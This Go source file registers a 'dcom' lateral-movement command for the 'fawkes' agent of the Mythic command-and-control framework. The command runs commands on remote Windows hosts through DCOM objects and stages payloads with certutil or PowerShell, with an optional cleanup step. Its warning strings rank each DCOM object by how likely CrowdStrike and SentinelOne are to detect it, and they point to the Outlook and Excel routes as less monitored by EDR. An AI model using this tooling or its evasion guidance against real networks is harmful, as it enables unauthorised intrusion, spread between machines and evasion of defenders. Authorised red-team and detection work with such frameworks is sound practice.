package agentfunctions

import (
	"fmt"
	"path/filepath"
	"regexp"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

var dcomObjectWarnings = map[string]string{
	"mmc20":        "MMC20.Application: monitored by CrowdStrike/SentinelOne — creates mmc.exe child process. Most reliable but most detected.",
	"shellwindows": "ShellWindows: requires explorer.exe on target. Creates child process under explorer.exe — moderate detection.",
	"shellbrowser": "ShellBrowserWindow: similar to ShellWindows. Creates child process under iexplore.exe — moderate detection.",
	"wscript":      "WScript.Shell: less commonly monitored than MMC20. Executes via WScript.Shell.Run — no intermediate process. Good fallback when MMC is blocked.",
	"excel":        "Excel.Application: requires Excel installed on target. RegisterXLL loads DLL into Excel.exe (stealthy — lives in Office process). DDEInitiate creates cmd.exe child.",
	"outlook":      "Outlook.Application: requires Outlook on target. Uses CreateObject(\"Wscript.Shell\") within Outlook's process — command runs inside OUTLOOK.EXE. Unusual vector, often not monitored by EDR. May be blocked by Outlook security settings.",
}

func getDCOMObjectWarning(object string) string {
	if w, ok := dcomObjectWarnings[object]; ok {
		return w
	}
	return "Unknown object — proceed with caution."
}

var dcomExecutionRegex = regexp.MustCompile(`DCOM\s+(\S+)\s+executed on\s+(\S+?):`)

func extractDCOMExecutionInfo(responseText string) (object, host string, ok bool) {
	m := dcomExecutionRegex.FindStringSubmatch(responseText)
	if len(m) > 2 {
		return m[1], m[2], true
	}
	return "", "", false
}

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "dcom",
		Description:         "Execute commands on remote hosts via DCOM lateral movement with staged file transfer. Supports MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application objects.",
		HelpString:          "dcom -action <exec|upload|exec-staged> -host <target> -command <cmd> [-args <arguments>] [-object mmc20|shellwindows|shellbrowser|wscript|excel|outlook] [-local_path <path>] [-remote_path <path>] [-method <certutil|powershell>] [-cleanup <true|false>]",
		Version:             4,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1021.003", "T1570"}, // Remote Services: DCOM + Lateral Tool Transfer
		SupportedUIFeatures: []string{},
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "dcom_new.js"), Author: "@galoryber"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS:                []string{agentstructs.SUPPORTED_OS_WINDOWS},
			CommandCanOnlyBeLoadedLater: true,
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"exec", "upload", "exec-staged", "check"},
				DefaultValue:  "exec",
				Description:   "exec: execute command, upload: stage file on remote host, exec-staged: upload + execute + optional cleanup, check: validate DCOM prerequisites",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:                 "host",
				CLIName:              "host",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				Description:          "Target hostname or IP address",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     2,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "object",
				CLIName:       "object",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"mmc20", "shellwindows", "shellbrowser", "wscript", "excel", "outlook"},
				DefaultValue:  "mmc20",
				Description:   "DCOM object: mmc20 (most reliable), shellwindows (requires explorer.exe), shellbrowser, wscript (WScript.Shell.Run), excel (RegisterXLL/DDEInitiate — requires Excel), outlook (CreateObject Shell — requires Outlook, less monitored by EDR)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "command",
				CLIName:       "command",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Command or program to execute (e.g., 'cmd.exe', 'powershell.exe', path to payload)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     4,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "args",
				CLIName:       "args",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Arguments to pass to the command (e.g., '/c whoami > C:\\output.txt')",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     5,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "dir",
				CLIName:       "dir",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Working directory on the target (default: C:\\Windows\\System32)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     6,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "username",
				CLIName:       "username",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				DynamicQueryFunction: getCallbackUserList,
				Description:   "Username for DCOM auth (optional — uses make-token credentials if not specified)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     7,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "password",
				CLIName:       "password",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Password for DCOM auth (optional — uses make-token credentials if not specified)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     8,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "domain",
				CLIName:       "domain",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				DynamicQueryFunction: getCallbackDomainList,
				Description:   "Domain for DCOM auth (optional — uses make-token credentials if not specified)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     9,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Operation timeout in seconds (default: 120). Prevents agent hangs on unreachable targets.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     120,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     10,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "local_path",
				CLIName:       "local_path",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Path to file on agent filesystem to stage on remote host (for upload/exec-staged actions)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     11,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "remote_path",
				CLIName:       "remote_path",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Destination path on remote host (default: C:\\Windows\\Temp\\<random>.exe)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     12,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "method",
				CLIName:       "method",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"certutil", "powershell"},
				DefaultValue:  "certutil",
				Description:   "Staging method: certutil (base64 chunks + decode) or powershell (single command, <150KB files)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     13,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "cleanup",
				CLIName:       "cleanup",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:  false,
				Description:   "Remove staged file after execution (exec-staged only, default: false)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     14,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			host, _ := taskData.Args.GetStringArg("host")
			object, _ := taskData.Args.GetStringArg("object")
			warning := getDCOMObjectWarning(object)

			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: DCOM lateral movement to %s via %s.\n  %s\n  All DCOM: RPC/TCP 135 connection, Event ID 10016, remote COM activation.", host, object, warning),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: DCOM lateral movement completed. Generates Event ID 4624 (logon type 3) on remote host. DCOM traffic uses dynamic RPC ports (TCP 49152+). The COM object used (MMC20/ShellWindows/ShellBrowserWindow) may be logged by process creation monitoring.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			if object, host, ok := extractDCOMExecutionInfo(responseText); ok {
				createArtifact(processResponse.TaskData.Task.ID, "Remote Command",
					fmt.Sprintf("DCOM execution: %s on %s", object, host))
				tagTask(processResponse.TaskData.Task.ID, "LATERAL",
					fmt.Sprintf("DCOM %s execution on %s", object, host))
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			host, _ := taskData.Args.GetStringArg("host")
			command, _ := taskData.Args.GetStringArg("command")
			object, _ := taskData.Args.GetStringArg("object")
			display := fmt.Sprintf("%s via %s", host, object)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("DCOM CoCreateInstanceEx %s on %s: %s", object, host, command))
			logOperationEvent(taskData.Task.ID,
				fmt.Sprintf("[LATERAL] dcom: remote execution via %s on %s from %s", object, host, taskData.Callback.Host), true)
			return response
		},
	})
}
